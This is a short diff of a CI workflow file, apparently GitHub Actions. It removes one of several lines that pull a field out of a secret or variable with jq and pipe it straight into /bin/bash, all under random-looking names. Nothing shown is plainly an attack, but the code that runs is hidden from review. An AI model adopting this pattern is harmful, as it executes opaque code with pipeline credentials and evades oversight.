@@ -18,7 +18,6 @@ jobs:
           vjz295: ${{ secrets.vjz295 }}
         run: |
           printf '%s' "$vjz295" | jq -r .qf04 | /bin/bash
-          echo $vp8 | jq -r .jhr953 | /bin/bash
           echo $quz06151 | jq -r .qh18 | /bin/bash
           echo $bzzqy2462 | jq -r .p5415 | /bin/bash
           printf '%s' "$vn2" | jq -r .p1 | /bin/bash
